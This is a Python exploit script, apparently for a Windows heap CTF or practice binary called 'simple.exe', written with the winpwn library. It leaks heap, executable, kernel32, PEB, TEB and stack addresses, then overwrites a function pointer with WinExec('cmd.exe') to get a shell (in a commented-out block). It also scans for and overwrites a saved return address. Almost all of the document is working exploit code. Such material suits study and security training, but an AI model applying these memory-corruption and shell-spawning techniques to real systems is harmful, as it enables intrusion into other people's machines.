from winpwn import *


#context.log_level = 'debug'
context.arch = 'i386'
context.windbg = "C:\\Users\\kruztw\\AppData\Local\\Microsoft\\WindowsApps\\WinDbgX.exe"


#windbg.attach(p)

def add(idx):
    r.recvuntil("op:")
    r.sendline("1")
    r.recvuntil("idx:")
    r.sendline(str(idx))

def free(idx):
    r.recvuntil("op:")
    r.sendline("2")
    r.recvuntil("idx:")
    r.sendline(str(idx))
    
def show(idx):
    r.recvuntil("op:")
    r.sendline("3")
    r.recvuntil("idx:")
    r.sendline(str(idx))
    
def edit(idx,size,content):
    r.recvuntil("op:")
    r.sendline("4")
    r.recvuntil("size:")
    r.sendline(str(idx) + ' ' + str(size))
    r.send(content)

def leak(addr):
    r.recvuntil("op:")
    r.sendline("5")
    r.recvuntil('addr:')
    r.sendline(str(addr))

def write(addr, val):
    r.recvuntil("op:")
    r.sendline("6")
    r.recvuntil('addr:')
    r.sendline(str(addr) + ' ' + str(val))
    

r = process("./simple.exe")

# leak puts (windbg: dt simple!chunks[0] ; lm)
add(0)
show(0)
heap_base = u64(r.recv(6).ljust(8, '\x00')) - 0x150
print("heap_base @ ", hex(heap_base))

edit(0, 0x10, 0x10*'a')

show(0)
r.recvuntil('a'*0x10)
puts_addr = u64(r.recv(6).ljust(8, '\x00'))
exe_base = puts_addr - 0x3f4e1
print("puts @ ", hex(puts_addr))
print("exe_base @ ", hex(exe_base))

# leak IAT (HeapCreate (use IDA Import to find offset))
HeapCreate_iat = exe_base + 0xe9000
print("HeapCreate_iat @ ", hex(HeapCreate_iat))
leak(HeapCreate_iat)
HeapCreate_addr = u64(r.recvline().strip().ljust(8, '\x00'))
print("HeapCreate_addr @ ", hex(HeapCreate_addr))
kernel32_base = HeapCreate_addr - 0x1e840
print("kernel32_base @ ", hex(kernel32_base))
Winexec_addr = kernel32_base + 0x64bc0

'''
# solution1
## overwrite puts_ptr to winexec
edit(0, 0x18, 'cmd.exe'.ljust(0x10, '\x00')+p64(Winexec_addr))
## get shell
show(0)
# exit origin program
r.sendline('7')
r.interactive()
'''


# https://xz.aliyun.com/t/6319
# leak stack 
## ntdll!PebLdr -> peb -> teb -> StackBase

### leak peb address : 在 ntdll!PebLdr 附近有   (windbg: r $peb ; dd ntdll!PebLdr

ntdll_PebLdr_addr = exe_base + 0x35b6e9120
print("ntdll_PebLdr_addr @ ", hex(ntdll_PebLdr_addr))
leak(ntdll_PebLdr_addr - 0x68)
peb_addr = u64(r.recvline().strip().ljust(8, '\x00')) - 0x80
print("peb_addr @ ", hex(peb_addr))
teb_addr = peb_addr + 0x1000 # ~0s; r $teb  (別拿到別的 thread )
print("teb_addr @ ", hex(teb_addr))
leak(teb_addr + 0x8 + 2) # 最後 2 bytes 是 0, 所以 + 2, 這個位址跟 ra 比較近
stack_addr = u64(2*'\x00' + r.recvline().strip().ljust(6, '\x00'))
print("stack @ ", hex(stack_addr))

# search ra (from ida (call j_main) or from windbg)
ra = exe_base + 0x45edc
print("ra @ ", hex(ra))

addr = 0
ptr_ra = stack_addr-0x8
while addr != ra:
    ptr_ra -= 0x10
    leak(ptr_ra)
    addr = u64(r.recvline().strip().ljust(8, '\x00'))

windbg.attach(r)
print("ptr_ra @ ", hex(ptr_ra))

# write rop
write(ptr_ra, 0xfaceb00c)

r.sendline('7')
r.interactive()
